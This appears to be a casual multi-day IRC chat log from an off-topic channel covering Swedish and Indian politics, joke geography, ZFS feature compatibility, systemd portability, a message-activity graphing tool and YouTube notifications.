Jul 03 13:18:24 <olsner>	V, the lizard people party
Jul 03 13:18:31 <FireFly>	and official acronym thingy, yeah
Jul 03 13:18:55 <shikhin>	Apparently Sweden has a minority government right now?
Jul 03 13:19:19 <FireFly>	Probably, I forget
Jul 03 13:19:55 <FireFly>	I feel like at this point you'll soon know more about sweden's elections than I do
Jul 03 13:20:06 <shikhin>	Haha, doubt it.
Jul 03 13:21:56 <olsner>	I think they're a minority, it was a big deal just after the last election about how to coalition into a government and approve a budget, but then everyone agreed to race to the middle so I think the "opposition" and the "government" are mostly the same now
Jul 03 13:22:26 <shikhin>	Ow.
Jul 03 13:23:23 <olsner>	the government parties are the supposedly left leaning ones, but they refused to cooperate with the left party for some reason
Jul 03 13:24:31 <shikhin>	"In 1998, the party obtained its best-ever result in a parliamentary election, getting 12% of the votes nationwide." …nice?
Jul 03 13:24:38 *	shikhin goes to have dinner.
Jul 03 13:25:09 <S_Gautam>	coalition government probably
Jul 03 13:25:12 <S_Gautam>	?
Jul 03 13:26:00 <olsner>	definitely coalition, since no party has a parliament majority on its own
Jul 03 13:26:58 <shikhin>	https://en.wikipedia.org/wiki/Riksdag – somewhat confusing since even the government + confidence and supply doesn't give a majority?
Jul 03 13:26:58 <bslsk05>	​en.wikipedia.org: Riksdag - Wikipedia
Jul 03 13:27:17 <FireFly>	confidence, supply?
Jul 03 13:27:31 <FireFly>	oh
Jul 03 13:27:41 <shikhin>	Mm.
Jul 03 13:28:41 <shikhin>	"The following general election to the unicameral Riksdag in 1973 only gave the Government the support of 175 members, while the opposition could mobilize an equal force of 175 members. In a number of cases a tied vote ensued, and the final decision had to be determined by lot. To avoid any reccurrence of this unstable situation, the number of seats in the Riksdag was reduced to 349, from 1976 onwards." 
Jul 03 13:28:47 <shikhin>	Haha.
Jul 03 13:29:02 <FireFly>	shikhin: yeah, which means SD (yellow) get to act as tie breakers when the "redgreen bloc" and "right-wing bloc" disagree (although, the blocks aren't as prominent nowadays which is nice)
Jul 03 13:30:04 <FireFly>	er, in response to the thing about the gov't + confidence and supply not forming a majority
Jul 03 13:30:39 <FireFly>	https://pt.wikipedia.org/wiki/Acordo_de_Dezembro  <- this is one of those cases where I look at the "languages" list in a swedish article and go "... why portuguese?"

Jul 03 13:30:51 <olsner>	hm, I guess they only need to beat the other block - if the opposition wanted to replace the government they'd be voted down by the sitting block (assuming the "others" don't get involved and support/block them)
Jul 03 13:32:35 <olsner>	apparently there is more to politics than simply having or not having the majority :)

Jul 03 14:41:00 <shikhin>	Certainly the worst of our worries.

Jul 03 14:44:01 <zgrep>	shikhin: So we made a comic about it.
Jul 03 14:44:01 <shikhin>	S_Gautam: …that's not even in India, for one.
Jul 03 14:45:01 <shikhin>	(And it's certainly not something you stop by building a wall in unrelated areas.)
Jul 03 14:45:41 <john_cephalopoda>	Unpopular opinions: Tibet is actually a part of Pakistan. Serbia doesn't actually exist, only Kosovo is a legitimate country and its area contains what is called "Serbia".

Jul 03 14:46:29 <nortti>	john_cephalopoda: please solve the northern irish situation too
Jul 03 14:46:35 <zgrep>	shikhin: All the people you see and hear around you are like a phantom limb, you want them to be real, you think they are, but they're not.

Jul 03 14:47:04 <john_cephalopoda>	nortti: Northern Ireland is actually part of Cuba while Southern Ireland is a colony of Southern Ireland.
Jul 03 14:47:27 <nortti>	a colony of itself… intriguing

Jul 03 14:47:59 <S_Gautam>	"It is evident from satellite pictures that over the years the Chinese have moved at least 5 km into what should be Indian territory. They may have taken advantage of the remoteness of the area and the absence of Indian forces."
Jul 03 14:48:03 <shikhin>	Again not something you solve by a wall.
Jul 03 14:48:23 <nortti>	right, a good defensive wall needs an active garrison
Jul 03 14:48:32 <nortti>	which, uh, that place doesn't seem to have
Jul 03 14:48:40 <john_cephalopoda>	Also Catalonia and the Saarland are actually the same thing but nobody cared to check for it on a map, so it's always handled like two different things.

Jul 03 14:49:27 <nortti>	john_cephalopoda: what about scotland?
Jul 03 14:50:05 <john_cephalopoda>	nortti: Scotland is actually a Swiss canton and inofficially owns half of Greenland.
Jul 03 14:50:34 <nortti>	is switzerland distinct from sweden?
Jul 03 14:51:48 <john_cephalopoda>	Yes, it actually is. 
Jul 03 14:51:59 <S_Gautam>	I remember reading about the Hindi-Chini bhai bhai (Indian-Chinese Brother Brother) slogans before China went full blitzkrieg and ended up occupying Aksai Chin. The most humiliating defeat since 1857. I don't really like thinking or even saying this, but this Modi-Xi partnership looks like another one of those Chinese government's "fish is caught when the water is muddy" type of scheme.
Jul 03 14:52:49 <john_cephalopoda>	nortti: Although it was connected to sweden by a narrow land bridge that went through Germany, Prussia, Russia and Finland.
Jul 03 14:52:51 <S_Gautam>	And what they've been doing in South China Sea as well
Jul 03 14:52:53 <john_cephalopoda>	Switzerland has mountains (Alps in the mainland, "Highlands" in the Scottish canton).
Jul 03 14:53:30 <john_cephalopoda>	S_Gautam: South Chinese Sea is actually part of Australia (although New Zealand also has some islands there, it's an ongoing war.)
Jul 03 14:53:45 <S_Gautam>	We can't sanction them probably because more than half the shit I own has a Made in China written on it somewhere
Jul 03 14:53:56 *	shikhin blinks.

Jul 03 14:54:29 <john_cephalopoda>	shikhin: I am presenting unpopular opinions about geographic quarrels.
Jul 03 14:55:06 <shikhin>	Wasn't blinking at that.
Jul 03 14:55:22 <john_cephalopoda>	Also Hong Kong is actually part of Thailand, which is part of East Germany but it pretty much standalone now due to the reunification of Germany in 1989.
Jul 03 14:55:37 <nortti>	john_cephalopoda: through germany, prussia and russia, but not poland?
Jul 03 14:55:39 <john_cephalopoda>	They just forgot to handle Thailand.
Jul 03 14:56:05 <john_cephalopoda>	nortti: Poland was taken over by Germany in WW2 and is now retroactively also a part of either Germany or Prussia.
Jul 03 14:56:36 <nortti>	*national socialism intensifies*
Jul 03 14:56:39 <john_cephalopoda>	After 1945 Poland is standalone again though.

Jul 03 15:02:47 <S_Gautam>	shikhin: the times of India released a perfume ad today where the ad was, you guessed it, literally sprayed with perfume with the text "Don't read the ad, smell it"
Jul 03 15:03:14 <shikhin>	Evidence that the Times of India should not be used as toilet paper, even?

Jul 04 01:40:40 <shikhin>	Although this autonomy has been enjoyed by the govt. of Delhi since it has existed in its current form, except for the AAP governments with BJP at the centre.
Jul 04 01:41:26 <shikhin>	(Last couple of years has basically been the government saying "we're doing this!" and the LG saying in the next week, "nope, you aren't" for no good reason.)
Jul 04 01:41:38 <nortti>	heh…
Jul 04 01:42:05 <nortti>	does the governor have connections with congress?
Jul 04 01:43:36 <shikhin>	The last LG was appointed by a congress-led government. Current one's served as a secretary with the previous BJP govt (which people say is significant), why do you ask?
Jul 04 01:44:31 <nortti>	because the autonomy suddenly decreasing when congress isn't in power seems awfully coincidental
Jul 04 01:44:54 <shikhin>	Pretty sure more to do with BJP.
Jul 04 01:45:21 <nortti>	mh
Jul 04 01:45:22 <shikhin>	There were rumors that the previous LG would be appointed the governor of some other state or some other nice job after he resigned suddenly.
Jul 04 01:45:30 <shikhin>	(Didn't happen, but eeh.)
Jul 04 01:49:59 <shikhin>	Grr, can't find that tweet; but classic example of what's been happening in Delhi: state govt announced decision to deliver ration services (instead of you going to an appointed centre), LG denied because impractical and no need for such fancy stuff, last week central government says they want all state govts to deliver such services.
Jul 04 01:50:24 <shikhin>	(Then Kejriwal responded to a news tweet on the central government's announcement saying "that's what we've been trying to do".)
Jul 04 01:50:48 <nortti>	heh…

Jul 04 01:57:23 <shikhin>	Oh, btw, now pondering learning Marathi (or trying to read a few books in Marathi and hoping things stick).
Jul 04 01:57:48 <nortti>	how far did you get with tamil?
Jul 04 01:57:53 <shikhin>	D:
Jul 04 01:58:17 <shikhin>	The plan has always been to learn Tamil when I'm in India, that seems way harder to learn without having a person present.
Jul 04 01:58:32 <nortti>	fair enough
Jul 04 01:58:54 <shikhin>	(For Marathi meanwhile I'm hoping a dictionary is all I need.)
Jul 04 01:59:00 <shikhin>	(But I don't know.)
Jul 04 01:59:26 <nortti>	is it close to hindi grammarwise?
Jul 04 01:59:56 <shikhin>	Seems like it.
Jul 04 02:00:33 <shikhin>	"भारतीय भाषा ज्योति: मराठी —a textbook for learning Marathi through Hindi from the Central Institute of Indian Languages" Oh, huh.

Jul 04 02:29:30 <john_cephalopoda>	Magic.
Jul 04 02:30:15 <john_cephalopoda>	I actually visited the Very Large Telescope this year and saw the place where the Extremely Large Telescope will be built.
Jul 04 02:31:18 <john_cephalopoda>	For the Very Large Telescope they used a mountain that was over 3 km high. Then they shaved off a few hundred meters in height and made a platform on that level where they built that telescope.
Jul 04 02:31:58 <john_cephalopoda>	It's just below 3000 meters, which means that legislation that grants workers extra money for working above 3 km over the sea level didn't and doesn't apply.
Jul 04 02:32:04 <john_cephalopoda>	Made it way cheaper to build :D
Jul 04 02:32:59 <shikhin>	…
Jul 04 02:33:40 <john_cephalopoda>	It is above the clouds at nearly all times. When I visited, it was nearly cloudless and you could see the pacific ocean on the horizon. In the other direction you could see a volcano that's either at the border to or already in Argentina.

Jul 04 02:37:36 <john_cephalopoda>	Instead of building things that people need and paying workers well, we build crap stuff that nobody needs to solve non-existent problems and use every chance to screw workers.

Jul 04 02:38:22 <john_cephalopoda>	Oh, and let's just fire a few thousand workers although the company does as well as never before because it will increase the money.

Jul 04 03:18:29 <john_cephalopoda>	Not-so-fun-fact: Engineers at the company that built the crematoriums in various concentration camps tried to patent an automated crematorium system that would have increased the speed of cremating a lot. Patent was denied because the crematoriums were war-related, secret technology.
Jul 04 03:18:55 <shikhin>	Hm?
Jul 04 03:19:04 <shikhin>	So they couldn't build it without a patent? I'm confused.
Jul 04 03:20:04 <john_cephalopoda>	The point is that they built crematoriums, but instead of questioning it, they went ahead and invented an automated, even better crematorium.
Jul 04 03:20:34 <john_cephalopoda>	They were never told to build a better one, they just came up with a better way and did the natural thing that an engineer would do.
Jul 04 03:20:52 <shikhin>	Pretty sure "the natural thing that an engineer would do" isn't to patent stuff.
Jul 04 03:21:41 <john_cephalopoda>	That was management obviously. But the engineers thought up that automated crematorium.
Jul 04 03:24:13 <john_cephalopoda>	It poses interesting questions. Like in how far those engineers are responsible for the deaths in the concentration camps. It wouldn't have been hard for that company and their engineers to slow down crematorium construction, blaming it on various factors. But instead they even thought up a better way to dispose of people.
Jul 04 03:24:24 <john_cephalopoda>	It was never used in the end, yet it shows 
Jul 04 03:24:36 <john_cephalopoda>	that they didn't really question things.
Jul 04 03:24:49 <shikhin>	How were the engineers hired in the first place, how willing were they?
Jul 04 03:25:33 <john_cephalopoda>	It was a normal company. Iirc they built ovens before the war.
Jul 04 03:26:10 <shikhin>	And all the same engineers kept working at it (or was there a lot of people leaving)?
Jul 04 03:26:39 <john_cephalopoda>	It wasn't always a crematorium production company.

Jul 04 12:46:14 <FireFly>	Of the ASCII representation of the hash
Jul 04 12:46:21 <FireFly>	but, it looks a bit nice :P
Jul 04 12:46:38 <nortti>	æsthetic
Jul 04 12:46:45 <olsner>	you could take a large directory of hashed files, pixd their hashes, sort by similarity to a target image and make it look like you've faked all the hashes
Jul 04 12:47:02 <nortti>	I guess it'd probably make sense to use a custom palette for ascii data
Jul 04 12:47:13 <FireFly>	I mean it'd make more sense to pixd the raw bytes rather than the ASCII representation of the hash I think

Jul 04 20:00:17 <zgrep>	This is probably sequential.

Jul 04 20:01:14 <zgrep>	What does it depend on?
Jul 04 20:01:31 <CompanionCube>	What are the features? How much do you care about compatibility and it bothering you with the message? 
Jul 04 20:02:09 <zgrep>	It doesn't say which features, just says to check zpool-features(5) for details, which is about all the features, of course.
Jul 04 20:02:17 <zgrep>	Compatibility with what?

Jul 04 20:12:45 <CompanionCube>	it is safe to upgrade if you only access the pool via linux
Jul 04 20:12:53 <zgrep>	Hmm.
Jul 04 20:13:02 <zgrep>	Uh. Hm.
Jul 04 20:13:18 <zgrep>	Currently I only access it via linux.
Jul 04 20:13:23 <zgrep>	But... the future is an unknown.
Jul 04 20:14:51 <CompanionCube>	ah, because the 2nd feature hasn't yet been ported to say, freebsd
Jul 04 20:15:07 <CompanionCube>	so if enabled you can't write to pool under that OS
Jul 04 20:16:43 <zgrep>	Hmm. But it is a read-able thing.
Jul 04 20:16:52 <zgrep>	Is it possible to downgrade in the future?
Jul 04 20:17:01 <zgrep>	Or, rather, undo the upgrade somehow?
Jul 04 20:17:12 <CompanionCube>	no
Jul 04 20:17:16 <zgrep>	:(
Jul 04 20:17:21 <zgrep>	Then I think I won't upgrade that.
Jul 04 20:17:22 <CompanionCube>	Not for that one
Jul 04 20:17:54 <zgrep>	Is there a way to see all active features (that aren't compatible with other ZFS versions)?
Jul 04 20:19:06 <CompanionCube>	in what context?
Jul 04 20:19:24 <CompanionCube>	for your own pool, 'zpool get' will do it
Jul 04 20:19:31 <zgrep>	Yes, for my own pool.
Jul 04 20:19:34 <CompanionCube>	Look for 'active' features
Jul 04 20:20:02 <CompanionCube>	then use google
Jul 04 20:20:11 <zgrep>	:( @ Google.
Jul 04 20:20:29 <zgrep>	Oh, wait, there's the man page. I can use that.
Jul 04 20:21:21 <CompanionCube>	('enabled' features are of no consequence to compatibility)
Jul 04 20:21:28 <zgrep>	Until they become active.
Jul 04 20:21:50 <CompanionCube>	for some it can go both ways
Jul 04 20:22:00 <zgrep>	Hm. Which company / identifiers tend to be compatible cross ZFS systems?
Jul 04 20:22:26 <zgrep>	(And is it theoretically possible that, say, FreeBSD's ZFS will support the org.zfsonlinux feature?)
Jul 04 20:23:13 <CompanionCube>	freebsd has their own manpage
Jul 04 20:23:56 <zgrep>	I wonder if anybody's made a nice, colorful table as to whether or not various features are supported in various places.
Jul 04 20:24:37 <zgrep>	The answer seems to be yes.
Jul 04 20:24:45 <zgrep>	Except it seems very out of date?
Jul 04 20:25:01 <zgrep>	It should be parsing the manpage, of course...

Jul 04 20:29:17 <zgrep>	Well, in that case the feature isn't documented, and that's now their problem...
Jul 04 20:29:34 <zgrep>	(and I can pretend that it doesn't exist / they don't support it)
Jul 04 20:29:48 <CompanionCube>	that is a good idea
Jul 04 20:30:12 <zgrep>	Hm. I don't think I want it to grab from master for zfsonlinux, for example, though.

Jul 05 02:41:20 <john_cephalopoda>	Walkthrough for Portable Services. Step 1: Don't use systemd. Step 2: Profit.
Jul 05 02:41:39 <john_cephalopoda>	How is it supposed to be portable when it uses systemd?
Jul 05 02:42:11 <john_cephalopoda>	It won't run on sortix. It won't run on *BSD. It won't run on Windows. Nor on MacOS.
Jul 05 02:42:56 <zgrep>	I think portable means something different and systemd specific in this case.
Jul 05 02:43:01 <john_cephalopoda>	Now in my webshop: Portable 1000 kg of lead (fused mounted to a van)
Jul 05 02:43:24 <FireFly>	what.
Jul 05 02:43:35 <zgrep>	Also, technically, no services can be portable under that definition.
Jul 05 02:44:28 <john_cephalopoda>	I can port many services to many platforms without many issues.
Jul 05 02:45:21 <FireFly>	does it run on android?
Jul 05 02:45:26 <john_cephalopoda>	It's literally chroot. But new and possibly with bugs.
Jul 05 02:45:49 <john_cephalopoda>	Chroot runs on android, windows, linux, bsd and sortix.
Jul 05 02:45:55 <FireFly>	then clearly it's portable; it works in my pocket whilst I'm moving about
Jul 05 02:46:22 <zgrep>	john_cephalopoda~2: Same applies for systemd services, then?
Jul 05 02:47:12 <john_cephalopoda>	I'll have to port systemd to all those platforms.
Jul 05 02:47:36 <john_cephalopoda>	Since systemd is replacing basically all parts of a system, it won't be simple to be ported.
Jul 05 02:47:43 <zgrep>	No. You won't. You don't have to port openrc to sortix to port a service script from Alpine to sortix.
Jul 05 02:48:25 <john_cephalopoda>	What language is the service script written in?
Jul 05 02:50:24 <john_cephalopoda>	Systemd uses some ini-style configuration for their "unit files" which define services. You'll need a parser for that, which is systemd in most cases.
Jul 05 02:50:27 <zgrep>	openrc is bash + their special definitions and functions, systemd is its weird config-file-like format, SMF I believe is an XML-based thing, runit is just an executable (iirc), etc... It varies wildly between all sorts of init systems.
Jul 05 02:51:17 <john_cephalopoda>	bash can be ported to other shells without many issues. Also bash is available on many systems.
Jul 05 02:51:29 <puckipedia>	macOS uses launchctl which is plists. you can't expect init scripts to be really portable 
Jul 05 02:51:34 <zgrep>	^
Jul 05 02:52:34 *	puckipedia mumbles MacOS vs macOS vs Mac OS
Jul 05 02:52:58 <zgrep>	john_cephalopoda: I'm confused as to what makes systemd service scripts less portable than other init systems, when they each have their own special ways to do things...
Jul 05 02:53:11 <zgrep>	other init systems' scripts
Jul 05 02:53:27 <puckipedia>	you could probably even say systemd unit scripts are like way more portable as they will at least work fine with like all the systems that have systemd
Jul 05 02:54:22 <zgrep>	Eeh. I wouldn't go that far, because all systems that have openrc can run openrc scripts. :P
Jul 05 02:55:00 <zgrep>	You can probably even launch openrc from systemd. I don't know if you can do the reverse, though... Does systemd require that it be PID 1?
Jul 05 02:55:13 <puckipedia>	zgrep: hm, openrc 'net' I wonder if that's specified
Jul 05 02:55:19 <puckipedia>	oh huh it is

Jul 05 02:58:47 <john_cephalopoda>	zgrep: The original point was that the chroot replacement that systemd does is called "portable" although it isn't portable at all.

Jul 05 14:01:57 <CompanionCube>	an LX zone is essentially a container that happens to run linux binaries.

Jul 05 14:49:31 <shikhin>	D:
Jul 05 14:49:39 <zgrep>	I had it like that, but comparing people didn't work.
Jul 05 14:49:51 <zgrep>	It's total number of messages every since that day in 2017.
Jul 05 14:50:00 <shikhin>	So?
Jul 05 14:50:00 <zgrep>	I... I don't see how that number tells you anything useful.
Jul 05 14:50:19 <shikhin>	E-exactly in the way that the graph currently does?
Jul 05 14:50:29 <shikhin>	On average, I speak less than or more than sortie at minute x of the day.
Jul 05 14:50:36 <zgrep>	No, the graph currently shows approximate activity over time.
Jul 05 14:50:38 <zgrep>	But this isn't on average.
Jul 05 14:50:40 <zgrep>	This is total.
Jul 05 14:50:46 <shikhin>	…what?
Jul 05 14:51:15 <zgrep>	I'm not averaging the number of messages per minute, I'm not even certain what that would entail.
Jul 05 14:51:36 <zgrep>	It's just the number of messages per minute, divided by the total number of messages (with some smoothing applied).
Jul 05 14:51:42 <shikhin>	Hm? The total tells you the same thing as the average, since both mine and sortie's data is from the same time period.
Jul 05 14:51:58 <shikhin>	Just, uh, have a flag where you don't divide by the total number of messages? That's what I want.
Jul 05 14:52:23 <zgrep>	But... why.
Jul 05 14:52:27 <zgrep>	I don't see what the use of that would be.
Jul 05 14:52:27 <shikhin>	I just told you…
Jul 05 14:52:36 <shikhin>	It compares actual activity?
Jul 05 14:52:59 <zgrep>	Hrmph. Fine.
Jul 05 14:53:05 <zgrep>	I'll see if I can put it in there.
Jul 05 14:53:11 <zgrep>	I don't know if I can, though, because the code is a horrible mess.
Jul 05 14:53:34 <shikhin>	(And, uh, if you really want to do it like I want it, you'd instead divide by the number of days since 2017-02-25.)
Jul 05 14:53:55 <zgrep>	Hmm?
Jul 05 14:54:03 <shikhin>	Hmm.
Jul 05 14:54:09 <zgrep>	Eeh. Grr.
Jul 05 14:54:24 *	shikhin isn't sure why this is so hard to understand.
Jul 05 14:54:31 <zgrep>	It's hard to implement.
Jul 05 14:54:51 <shikhin>	Err, bah, wait, I'll do it.
Jul 05 14:55:10 <zgrep>	It's hard to implement because of the way I have it set up at the moment.
Jul 05 14:55:44 <zgrep>	Because computing the data for each person takes a lot of time, I pre-compute it and save it in a directory.
Jul 05 14:55:57 <shikhin>	You also normalize it?
Jul 05 14:56:29 <zgrep>	Hrm. Hold on... maybe....
Jul 05 14:57:25 <shikhin>	Seems like you do.
Jul 05 14:57:56 <shikhin>	(Then the solution seems pretty simple, just normalize it if some flag isn't set.)
Jul 05 14:58:25 <zgrep>	What do you mean by normalize?
Jul 05 14:58:59 <shikhin>	Dividing by either the total number of messages (or the number of days since 2017-02-25).
Jul 05 14:59:54 <zgrep>	Ah, yeah. Hm. What will the number of days since 2017-02-25 give you?
Jul 05 15:00:20 <shikhin>	The number of days since 2017-02-25?
Jul 05 15:00:23 <zgrep>	shikhin: There. &nodiv=1
Jul 05 15:01:09 *	heat has quit (Remote host closed the connection)
Jul 05 15:01:10 <shikhin>	Aha.
Jul 05 15:01:29 <zgrep>	Whoops. I broke it.
Jul 05 15:01:31 <shikhin>	Did it break?
Jul 05 15:01:37 <zgrep>	There, fixed.
Jul 05 15:02:17 <shikhin>	https://soluble.zgrep.org/offtopia?nick=shikhin&nick=zgrep&nick=nortti&together=1&nodiv=1 See, much more meaningful now.
Jul 05 15:02:48 <shikhin>	A-are you dividing by the number of days?
Jul 05 15:02:53 <zgrep>	Not yet.
Jul 05 15:02:55 <zgrep>	Hold on.
Jul 05 15:02:55 <shikhin>	Ah.
Jul 05 15:05:52 <zgrep>	shikhin: This won't be accurate. :/
Jul 05 15:06:05 <zgrep>	shikhin: Because some people joined offtopia after the first day of the logs.
Jul 05 15:06:25 <shikhin>	It's alright, I only really care about myself.
Jul 05 15:06:28 <zgrep>	._.
Jul 05 15:06:45 <zgrep>	I can probably do a thing where it checks to see a person's first occurrence in the logs, and uses that.
Jul 05 15:07:04 <shikhin>	That seems like a better solution, except then you'd need to know the day?
Jul 05 15:07:11 <zgrep>	Hm?
Jul 05 15:07:17 <zgrep>	I do, when parsing the entire logs every midnight.
Jul 05 15:07:34 <shikhin>	Do you know when it's midnight? (What if no message was sent on a day?)
Jul 05 15:07:47 <zgrep>	I'm confused...
Jul 05 15:08:01 <zgrep>	I'd record what day a person first spoke in the channel, and then I'd do today - that day.
Jul 05 15:08:06 <shikhin>	Sure.
Jul 05 15:08:13 <shikhin>	(Just curious how you know what day that is.)
Jul 05 15:08:20 <zgrep>	I read the log and record it?
Jul 05 15:08:28 <shikhin>	How does your log record days?
Jul 05 15:08:31 <zgrep>	Every midnight, cron launches a script that reads the log, and prepares the data.
Jul 05 15:08:37 <zgrep>	It's just happybot's normal log.
Jul 05 15:08:45 <shikhin>	e.g. message?
Jul 05 15:08:54 <shikhin>	s/e.g./Example/
Jul 05 15:08:54 <bslsk05>	​<shikhin*> Example message?
Jul 05 15:08:56 <zgrep>	Yeah. Your bog standard IRC log format.
Jul 05 15:09:02 <shikhin>	Mine just records the time.
Jul 05 15:09:08 <zgrep>	Ah.
Jul 05 15:09:15 <zgrep>	ii records date and time.
Jul 05 15:09:19 <shikhin>	Ah.
Jul 05 15:09:27 <zgrep>	irssi records day too.
Jul 05 15:09:33 <zgrep>	It says "day changed to ..."
Jul 05 15:09:37 <shikhin>	Indeed.
Jul 05 15:09:53 <shikhin>	(That's why I asked < shikhin> Do you know when it's midnight?)
Jul 05 15:11:07 <shikhin>	zgrep: Obviously that'd be a bit inaccurate because what about people who were already in the channel before then (say, sortie) but who might not have spoken exactly on that day or for a couple of days since then. :P
Jul 05 15:11:24 <sortie>	Hello I am sortie
Jul 05 15:11:28 <shikhin>	Hey sortie.
Jul 05 15:11:31 <shikhin>	How's the vacation going?
Jul 05 15:11:48 <sortie>	Norma-- wait what vacation
Jul 05 15:11:48 <zgrep>	shikhin: Yeah, but it'll be closer.
Jul 05 15:11:52 <sortie>	That's not just yet
Jul 05 15:12:01 <shikhin>	zgrep: Hehe, I'm just being a pain.
Jul 05 15:12:05 <shikhin>	sortie: Ah.
Jul 05 15:12:41 <zgrep>	shikhin: I'll be approximate and only count the days, not the minutes.
Jul 05 15:12:55 <shikhin>	Hehe.
Jul 05 15:15:58 <zgrep>	shikhin: &timediv=1
Jul 05 15:16:24 <zgrep>	Err, might want to wait a bit.
Jul 05 15:16:27 <zgrep>	I'll recalculate it just in case.
Jul 05 15:16:31 <shikhin>	"Error, invalid --ah.
Jul 05 15:16:39 <zgrep>	It just did you.
Jul 05 15:16:47 <zgrep>	You should be valid now.
Jul 05 15:16:55 <zgrep>	Done.
Jul 05 15:17:02 *	shikhin isn't sure how to interpret this.
Jul 05 15:17:09 <zgrep>	._.
Jul 05 15:17:11 <shikhin>	Hey.
Jul 05 15:17:16 <zgrep>	It's also a bit wrong.
Jul 05 15:17:19 <zgrep>	Err, my code.
Jul 05 15:17:19 <zgrep>	Not the data.
Jul 05 15:17:20 <shikhin>	How so?
Jul 05 15:17:30 <zgrep>	Well, now the maximum isn't 1 by default. :D:
Jul 05 15:17:45 <shikhin>	https://soluble.zgrep.org/offtopia?nick=shikhin&timediv=1 –– is that 3.5 messages per minute? Because that doesn't seem very right.
Jul 05 15:17:53 <zgrep>	shikhin: It should be per day.
Jul 05 15:17:57 <zgrep>	I... I dunno.
Jul 05 15:18:05 <shikhin>	3.5 messages per $unit of time per day, yes.
Jul 05 15:18:05 <bslsk05>	​shikhin: Das ist Nümberwang!
Jul 05 15:18:08 <shikhin>	What's $unit of time.
Jul 05 15:18:21 <zgrep>	Hm? It's total number of messages / total number of days at the moment.
Jul 05 15:18:32 <shikhin>	total number of messages… at what? A minute? An hour?
Jul 05 15:18:38 <zgrep>	Total number of messages per minute.
Jul 05 15:18:47 <shikhin>	So I peak at 3.5 messages per minute?
Jul 05 15:18:52 <zgrep>	Yeah.
Jul 05 15:18:54 <zgrep>	On average.
Jul 05 15:18:55 <shikhin>	Interesting.
Jul 05 15:19:09 <zgrep>	And this is why averaging doesn't work. :P
Jul 05 15:19:13 <shikhin>	Why not?
Jul 05 15:19:19 <shikhin>	Seems correct to me.
Jul 05 15:19:23 <zgrep>	Because you clearly do far more than 3.5 messages per minute.
Jul 05 15:19:30 <shikhin>	Not on average.
Jul 05 15:19:35 <zgrep>	Hm. Maybe.
Jul 05 15:19:45 <shikhin>	Unless you miscalculated things. :P
Jul 05 15:19:53 <zgrep>	:P
Jul 05 15:20:40 <zgrep>	Ah, I only had the new options enabled for &together=1.
Jul 05 15:20:41 <zgrep>	Fixed that.
Jul 05 15:21:04 <zgrep>	Maybe later I can figure out a way to calculate this data more efficiently.
Jul 05 15:21:09 <zgrep>	So that it doesn't memory error on me.
Jul 05 15:21:26 <zgrep>	I think what's actually memory erroring is the smoothing I'm applying.
Jul 05 15:21:41 <shikhin>	You do the smoothing yourself?
Jul 05 15:21:44 <zgrep>	Yeah.
Jul 05 15:21:48 <shikhin>	(i.e. it isn't something matplotlib does?)
Jul 05 15:21:57 <zgrep>	Because I have data per minute, but that's too specific / results in a very jaggedy graph.
Jul 05 15:22:14 <zgrep>	Yeah, it is, but I did it myself for some reason.
Jul 05 15:22:19 <shikhin>	Hehe.
Jul 05 15:22:25 <zgrep>	It looks pretty, though.
Jul 05 15:22:27 <zgrep>	:P
Jul 05 15:22:37 <shikhin>	Try calculating the entire offtopia data for a shorter period of time, e.g. last month?
Jul 05 15:22:45 <zgrep>	Huh. Smoothing isn't built in.
Jul 05 15:23:03 <zgrep>	shikhin: That would look worse, because I have fewer data points.
Jul 05 15:23:12 <zgrep>	Which means even more discrepencies.
Jul 05 15:23:19 <zgrep>	Which means it looks ever worse.
Jul 05 15:23:20 <shikhin>	You can smooth it, hopefully.
Jul 05 15:23:33 <zgrep>	There's scipy, which can interpolate.
Jul 05 15:23:52 <zgrep>	I'll probably set that up, then.
Jul 05 15:24:11 <zgrep>	Later.
Jul 05 15:24:14 <zgrep>	Food first.

Jul 06 12:01:30 <john_cephalopoda>	I am using an RSS reader and I am subscribed to 18 channels. Some post 3 or 4 videos daily. I just click them away. Some post once a month. I see when they do because it shows me that there is a new message.
Jul 06 12:01:46 <shikhin>	Not everyone wants that, again…
Jul 06 12:01:58 <john_cephalopoda>	shikhin: Want what?
Jul 06 12:02:10 <shikhin>	To get 4 notifications daily of videos they don't want to watch.
Jul 06 12:02:12 <nortti>	have to click "dismiss" four times each time you open it

Jul 06 12:07:16 <nortti>	some people have different use cases for technology than you
Jul 06 12:08:06 <nortti>	just because you don't have any use for even the most rudimentary priorization filtering doesn't mean no one does
Jul 06 12:08:43 <nortti>	also, I wonder why exactly, but I feel quite a few ppl in tech have this idea that convenience features are bad actually, if it makes a thing more complex
Jul 06 12:09:10 *	shikhin nods.
Jul 06 12:09:57 <nortti>	(used to hold that view myself, but haven't really analyzed why)
Jul 06 12:10:55 <john_cephalopoda>	nortti: I just see half a minute of "Oh, btw, youtube fucked the way subscribing works up and now there's that bell that you have to click if you don't want THE ALGORITHM to swallow my videos." in many channels that I'm monitoring.
Jul 06 12:11:33 <nortti>	there is no ~algorithm~ swallowing your videos
Jul 06 12:11:40 <olsner>	if you don't enable notifications you don't get them? this is not a sinister algorithm issue
Jul 06 12:11:45 <shikhin>	^^
Jul 06 12:11:48 <nortti>	you go to the subscription page, you get a reverse chronological view
Jul 06 12:12:29 <nortti>	this is an additional feature, where you can prioritize certain channels so you get a *notification* for them
Jul 06 12:13:34 <john_cephalopoda>	olsner: You got notifications before but now you don't get them any more. That's a user interface/feature design issue.
Jul 06 12:13:38 <nortti>	unsure if subscribing worked differently at some point between 2012 and 2017, but the subscription page is pretty much an updated version of the 2012 subscription system as far as I can tell
Jul 06 12:14:18 <shikhin>	Not sure what the problem is even if it did work differently. Clearly they did a good job informing you about it because you know it works differently now.
Jul 06 12:17:15 <nortti>	john_cephalopoda: hm, so at some point subscribing both added the video to your subscriptions page, and in addition to that generated an extra notification always?

I'm having a hard time coming up with a 8 character password.
Jul 06 15:18:14 <sortie>	It actually was tricky to find a fitting password. A long string of base64 encoded /dev/urandom was unlikely to fit the particular requirements, a little worse than the tweet suggests.
Jul 06 15:18:28 <sortie>	But I'm pretty sure a 8 character password is impossible

Jul 07 11:59:31 <FireFly>	well a common algebraic law is that a/b = c <=> a = b*c, but that breaks down for b = 0 of course
Jul 07 11:59:41 <FireFly>	well s/common/simple/
Jul 07 11:59:43 <FireFly>	or something
Jul 07 11:59:53 <nortti>	right, but why is that a law?

Jul 07 12:01:29 <john_cephalopoda>	Secretly replace her calculator app with one that thinks 2+2=5 to convince her that the calculator is broken.
Jul 07 12:01:33 <john_cephalopoda>	nortti: ^
Jul 07 12:01:33 <zgrep>	nortti: If x/0 = 0, then 0*0 = x. How the fuck does that make sense? :P
